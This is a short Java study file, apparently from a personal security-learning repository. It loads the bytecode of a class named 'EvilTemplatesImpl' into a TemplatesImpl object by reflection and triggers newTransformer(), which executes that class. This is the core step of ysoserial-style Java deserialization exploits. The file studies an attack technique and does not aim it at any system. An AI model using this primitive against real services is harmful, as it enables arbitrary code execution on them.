package com.xjjlearning.hack.java.classloader;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;

/**
 * created by xjj on 2023/1/31
 */
public class HelloTemplatesImpl {

    public static void main(String[] args) throws Exception {
        /**
         * 1.
         * getTransletClasses():  _class == null ->
         * /getTransletIndex(): _class == null ->
         * /getOutputProperties() -> newTransformer() -> getTransletInstance(): _name != null && _class == null ->
         *
         */

        // 2.defineTransletClasses() -> defineClass()

        class A extends TransformerFactoryImpl {}

        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);

        TemplatesImpl templates = new TemplatesImpl();
        ReflectionUtil.setFieldValue(templates, "_name", "");
        ReflectionUtil.setFieldValue(templates, "_class", null);
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{code});
        ReflectionUtil.setFieldValue(templates, "_tfactory", new A());

        templates.newTransformer();
    }
}
